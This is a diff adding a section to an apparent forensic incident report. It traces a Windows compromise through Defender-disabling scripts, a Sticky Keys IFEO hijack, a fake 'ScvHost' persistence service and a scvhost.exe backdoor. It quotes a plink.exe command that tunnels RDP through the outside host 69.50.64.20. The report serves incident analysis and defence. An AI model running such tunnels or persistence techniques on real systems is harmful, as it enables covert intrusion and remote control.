@@ -126,3 +126,106 @@ The system was compromised through a well-orchestrated attack that began with th
   - **Base64 Decoded Scripts:** `sticky.ps1`, `Service.ps1`, etc.
 
 ###
+### **Technical Incident Report: Extent of the Compromise**
+
+---
+
+#### **2. What Was the Extent of the Compromise?**
+
+The compromise of the system was extensive, involving multiple stages that allowed the attacker to disable security features, persistently control the system, and establish remote access for further exploitation. The attacker used a combination of PowerShell scripts, malicious executables, and SSH tunneling to ensure deep and sustained access to the compromised system.
+
+---
+
+### **Second and Third Stage of Infection**
+
+The second and third stages of the infection involved the execution of PowerShell scripts to disable security mechanisms and establish persistence, followed by the deployment of a backdoor and the setup of an SSH tunnel for remote control.
+
+#### **Second Stage: Execution of Malicious PowerShell Scripts**
+
+1. **Execution of `vagrant-shell.ps1`:**
+   - **Execution Context:** The `vagrant-shell.ps1` script was executed to disable various security features, particularly those related to Windows Defender. This script neutralized the system's defenses, allowing the attacker to proceed with further malicious actions without being detected.
+   - **Evidence:**
+     - **PowerShell Logs:** The execution was recorded in the PowerShell logs, showing the script being run from `c:\tmp\vagrant-shell.ps1`.
+     - **Impact:** The script disabled real-time protection, behavior monitoring, and other critical Windows Defender features.
+     ```plaintext
+     Execution Time: 2019-08-17 13:36:26 to 13:36:33
+     Script Path: c:\tmp\vagrant-shell.ps1
+     ```
+
+2. **Execution of `WinRM_Elevated_Shell.ps1`:**
+   - **Execution Context:** This script created a scheduled task to run with elevated privileges, allowing the attacker to execute commands as a system-level user.
+   - **Evidence:**
+     - **PowerShell Logs:** The script `winrm-elevated-shell.ps1` was executed, creating a scheduled task named `WinRM_Elevated_Shell` to ensure the attacker retained elevated access.
+     ```plaintext
+     Execution Time: 2019-08-17 13:36:27 to 13:36:40
+     Script Path: c:/windows/temp/winrm-elevated-shell.ps1
+     ```
+
+3. **Execution of `Sticky.ps1`:**
+   - **Execution Context:** The `Sticky.ps1` script hijacked the Sticky Keys functionality by replacing the `sethc.exe` process with `cmd.exe`, allowing the attacker to gain system-level access from the login screen.
+   - **Evidence:**
+     - **PowerShell Logs:** The execution of this script was recorded, showing it was run from `C:\Users\Alan\AppData\Local\Temp\Sticky.ps1`.
+     - **Impact:** This script modified the IFEO registry key for `sethc.exe`, enabling the attacker to press Shift five times at the login screen to access a command prompt with system privileges.
+     ```plaintext
+     Execution Time: 2019-08-17 13:49:01 to 13:49:02
+     Script Path: C:\Users\Alan\AppData\Local\Temp\Sticky.ps1
+     ```
+
+4. **Execution of `Service.ps1`:**
+   - **Execution Context:** The `Service.ps1` script created and started a malicious service named `ScvHost` that ensured persistence by running a malicious executable upon system startup.
+   - **Evidence:**
+     - **PowerShell Logs:** The execution of `Service.ps1` was recorded, indicating that it was run from `C:\Users\Alan\AppData\Local\Temp\Service.ps1`.
+     - **Impact:** This script ensured that the `scvhost.exe` executable would run automatically on system startup, maintaining the attacker's access.
+     ```plaintext
+     Execution Time: 2019-08-17 13:49:18 to 13:49:48
+     Script Path: C:\Users\Alan\AppData\Local\Temp\Service.ps1
+     ```
+
+#### **Third Stage: Deployment of Backdoor and Establishment of Remote Access**
+
+1. **Download and Execution of `scvhost.exe`:**
+   - **Execution Context:** The `scvhost.exe` file, maliciously named to mimic the legitimate Windows process `svchost.exe`, was downloaded and executed. This file served as a backdoor, providing the attacker with persistent remote access to the compromised system.
+   - **Evidence:**
+     - **File Analysis:** The presence and execution of `scvhost.exe` were confirmed through memory and disk analysis. Unlike the legitimate `svchost.exe` located in `C:\Windows\System32\`, this version was found in `C:\Users\Alan\AppData\Local\Temp\` and was flagged as malicious by multiple antivirus engines.
+     - **Impact:** The execution of `scvhost.exe` allowed the attacker to maintain a backdoor for remote control.
+     ```plaintext
+     File Name: scvhost.exe
+     File Path: C:\Users\Alan\AppData\Local\Temp\scvhost.exe
+     ```
+
+2. **Establishment of SSH Tunnel Using `plink.exe`:**
+   - **Execution Context:** The `plink.exe` executable was used to create an SSH tunnel that forwarded a local port (127.0.0.1:12345) to a remote IP (10.2.0.2:3389), effectively enabling remote desktop access over RDP. This port forwarding facilitated unauthorized remote access to the system.
+   - **Evidence:**
+     - **Prefetch Files:** The execution of `plink.exe` was confirmed via prefetch files, which indicated it was run from `\Windows\Temp\`.
+     - **Command-Line Arguments:** The command-line arguments used with `plink.exe` specified the SSH connection to the remote server `69.50.64.20` on port `22` and the forwarding of traffic to port `3389`, the default port for RDP.
+     ```plaintext
+     Execution Time: 2019-08-17 05:52:31 AM (UTC)
+     File Path: \Windows\Temp\plink.exe
+     Command: plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
+     ```
+
+   - **Significance:** The use of port `3389` is particularly concerning, as it allows the attacker to operate a remote desktop session, effectively gaining complete control over the system.
+
+---
+
+### **Actions Taken on Target**
+
+1. **Execution of Malicious Scripts and Files:**
+   - **PowerShell Scripts:** The attacker executed multiple PowerShell scripts (`vagrant-shell.ps1`, `WinRM_Elevated_Shell.ps1`, `Sticky.ps1`, `Service.ps1`) to disable security features, establish persistence, and create a backdoor.
+   - **Malicious Executables:** The attacker deployed and executed `scvhost.exe`, a malicious backdoor that mimicked a legitimate Windows process.
+
+2. **Establishment of Persistence:**
+   - **Service Creation:** The attacker used the `Service.ps1` script to create a persistent service (`ScvHost`), ensuring that the backdoor would remain active even after system reboots.
+   - **IFEO Modification:** The attacker modified the IFEO registry key using `Sticky.ps1`, replacing `sethc.exe` with `cmd.exe` to gain easy access to a command prompt with elevated privileges.
+
+3. **Establishment of Remote Access:**
+   - **SSH Tunnel Creation:** The attacker used `plink.exe` to create an SSH tunnel that forwarded RDP traffic, enabling remote desktop access over port `3389`.
+   - **C2 Communication:** The `scvhost.exe` backdoor communicated with the C2 server at `69.50.64.20`, allowing the attacker to issue commands and maintain control over the compromised system.
+
+---
+
+### **Conclusion**
+
+The extent of the compromise was severe, involving multiple stages of infection that effectively disabled the system's defenses, established persistent backdoors, and enabled remote access through an SSH tunnel. The attacker's use of PowerShell scripts and malicious executables, combined with the creation of an SSH tunnel via `plink.exe`, allowed for sustained control over the compromised system. The communication with a C2 server further indicates that the attacker maintained ongoing remote access, potentially for data exfiltration or further exploitation.
+
+This report highlights the sophisticated nature of the attack, the methods used to bypass security measures, and the extent of the system compromise. The evidence gathered from PowerShell logs, memory analysis, and network traffic provides a detailed understanding of the attack's progression and impact.
